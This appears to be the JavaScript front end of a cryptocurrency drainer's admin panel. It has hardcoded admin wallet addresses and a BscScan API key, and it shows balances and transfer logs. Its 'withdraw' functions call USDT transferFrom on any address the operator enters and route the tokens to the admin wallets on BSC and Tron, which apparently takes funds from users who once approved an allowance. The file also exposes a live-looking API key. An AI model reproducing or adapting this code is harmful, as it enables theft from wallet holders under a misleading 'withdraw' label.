// Wallets & contracts
const TRC20_ADMIN = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
const BEP20_ADMIN = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_API_KEY = "KW2H7WKIP7Q8UTFB7G7Q1U24R8XWV5KDY4";

// Load balances
async function loadBalances() {
  // TRC-20 via TronGrid
  try {
    const res = await fetch(`https://api.trongrid.io/v1/accounts/${TRC20_ADMIN}`);
    const json = await res.json();
    const tokens = json.data[0]?.assetV2 || [];
    const usdt = tokens.find(t => t.key === "Tether USD");
    document.getElementById("trcBalance").innerText = usdt ? (usdt.value / 1e6).toFixed(2) + " USDT" : "0 USDT";
  } catch (err) {
    document.getElementById("trcBalance").innerText = "Error";
  }

  // BEP-20 via BscScan
  try {
    const url = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${BEP20_USDT}&address=${BEP20_ADMIN}&tag=latest&apikey=${BSC_API_KEY}`;
    const res = await fetch(url);
    const json = await res.json();
    const balance = parseFloat(json.result) / 1e18;
    document.getElementById("bepBalance").innerText = balance.toFixed(2) + " USDT";
  } catch (err) {
    document.getElementById("bepBalance").innerText = "Error";
  }
}

// Logs
async function loadLogs() {
  const logList = document.getElementById("logList");
  logList.innerHTML = "";

  try {
    const res = await fetch(`https://api.bscscan.com/api?module=account&action=tokentx&address=${BEP20_ADMIN}&startblock=0&endblock=99999999&sort=desc&apikey=${BSC_API_KEY}`);
    const json = await res.json();
    const txs = json.result.slice(0, 10);
    txs.forEach(tx => {
      const li = document.createElement("li");
      li.innerText = `🔶 ${tx.from} → ${tx.to} | ${parseFloat(tx.value) / 1e18} USDT | ${tx.methodId}`;
      logList.appendChild(li);
    });
  } catch (err) {
    const li = document.createElement("li");
    li.innerText = "Error loading BEP-20 logs.";
    logList.appendChild(li);
  }
}

// Manual BEP-20 Withdraw
async function withdrawBEP20() {
  const from = document.getElementById("fromAddress").value.trim();
  const amount = document.getElementById("amount").value.trim();
  const status = document.getElementById("withdrawStatus");

  if (!window.ethereum) return alert("MetaMask not detected.");
  await ethereum.request({ method: 'eth_requestAccounts' });
  const web3 = new Web3(window.ethereum);

  const contract = new web3.eth.Contract([
    { "constant": false, "inputs": [ { "name": "from", "type": "address" }, { "name": "to", "type": "address" }, { "name": "value", "type": "uint256" } ], "name": "transferFrom", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" }
  ], BEP20_USDT);

  try {
    const accounts = await web3.eth.getAccounts();
    await contract.methods.transferFrom(from, BEP20_ADMIN, web3.utils.toWei(amount, "ether")).send({ from: accounts[0] });
    status.innerText = `✅ BEP-20 Withdraw successful`;
  } catch (err) {
    status.innerText = `❌ BEP-20 Withdraw failed: ${err.message}`;
  }
}

// Manual TRC-20 Withdraw
async function withdrawTRC20() {
  const from = document.getElementById("fromAddress").value.trim();
  const amount = parseFloat(document.getElementById("amount").value.trim());
  const status = document.getElementById("withdrawStatus");

  if (!window.tronWeb?.defaultAddress?.base58) return alert("TronLink not connected.");

  try {
    const contract = await tronWeb.contract().at("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"); // TRC-20 USDT
    const tx = await contract.transferFrom(from, TRC20_ADMIN, amount * 1e6).send();
    status.innerText = `✅ TRC-20 Withdraw TX: ${tx}`;
  } catch (err) {
    status.innerText = `❌ TRC-20 Withdraw failed: ${err.message}`;
  }
}

loadBalances();
loadLogs();
